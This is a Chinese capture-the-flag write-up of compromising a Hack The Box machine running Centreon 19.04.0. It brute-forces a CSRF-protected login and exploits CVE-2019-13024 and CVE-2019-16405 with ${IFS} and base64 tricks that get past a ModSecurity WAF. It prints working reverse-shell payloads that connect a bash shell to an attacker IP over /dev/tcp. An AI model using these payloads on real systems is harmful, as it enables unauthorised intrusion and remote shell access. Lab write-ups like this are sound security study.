枚举

Web枚举

http://10.10.10.157/monitoring需要验证

渗透

没有太多可以枚举的东西，当前可以使用hydra对HTTP认证模式进行暴力破解

这里有点奇怪，对返回401的页面更改请求方式为POST，它会重定向到/centreon。也许是Apache的某种错误配置?

查看页面/centreon

所以当前网站运行这centreon，一个开源的网络监控平台，版本为19.04.0，我们可以直接搜索公开漏洞

发现RCE漏洞，不过该漏洞需要凭据。谷歌默认凭据得到admin/centreon

不过这里没有生效

尝试了其他一些弱口令之后，实在没啥进展，所以我决定对其进行暴力破解，不过这里有CSRF_TOKEN

CSRF暴力破解

BurpSuite PitchFork

在HTB:Blunder中，我使用BurpSuite Macro对CSRF_TOKEN，这次换一下，使用BurpSuite的PitchFork功能，它发送的payload总数为单个字典的的数目

username password
username1 password1
username2 password2
username3 password3

我们可以使用Grep - Extract抓取token，然后配合密码进行发送

幸运，我们可以通过暴力破解得到正确的密码

使用凭据admin/password1，成功登陆

API

通过官方文档，Centreon有一个API可以接受认证，我们可以直接对API发起验证，比如通过工具curl

Exploit

CVE-2019-13024

发现漏洞编号2019-13024，这里我要手动利用它，找到了这篇文章

首先选择Configure pollers

选中对象Central进入配置界面，在Monitoring Engine Binary处插入payload

文章中说要自己手动构造一个POST请求

这个请求包可以在Export configuration

选中对象Central，之后点击Export，即可回显

到这里，RCE就成功了，现在就差反弹shell了

CVE-2019-16405

在Configuration→Commands→Miscellaneous点击Add

填写Command Name，Command Line输入要执行的指令，Argument Example输入目标机器，点击蓝色箭头，命令就会执行

Bypass WAF

如果我们使用CVE-2019-13024，输入payload:echo test

页面返回403

尝试使用${IFS}，在Linux的命令注入里，这表示空格

可以发现，命令执行成功

或者尝试其他过滤方式，比如{ping,-c,1,10.10.16.12}

这里看来是存在过滤，不过这里有一个地方很有意思，如果我们使用CVE-2019-16405，它又可以接收空格

这里一开始没明白怎么会是，只是感觉CVE-2019-13024不接收空格这个字符，后来弄明白了这里的原因(剧透:CVE-2019-13024的命令执行使用了POST请求，后端的WAF ModeSecurity会过滤POST请求的空格字符，而CVE-2019-16405的命令注入使用了GET请求，WAF不会对GET请求进行过滤)

CVE-2019-13024绕过

这里的绕过主要针对空格，我们可以尝试

所有payload就是echo${IFS}cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==${IFS}|base64${IFS}-d${IFS}|bash，不过输入输入会报错，命令执行失败

尝试修改payload，一段时间后，发现需要在命令后面添加分号，也许是需要隔开后面的参数

payload:echo${IFS}cGluZyAtYyAxIDEwLjEwLjE2LjEyCg==${IFS}|base64${IFS}-d${IFS}|bash;

这次命令执行成功

所以修改payload

payload:echo${IFS}YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg==${IFS}|base64${IFS}-d${IFS}|bash;

成功获得shell

CVE-2019-16405绕过

尝试payload:bash -c 'bash -i >& /dev/tcp/10.10.16.12/4444 0>&1'

得到很多转义，尝试base64编码

payload:echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMi80NDQ0IDA+JjEnCg== |base64 -d |bash

这里更加明显了，直接过滤了管道|，目前看来，这里过滤特殊符号，但是不过滤空格
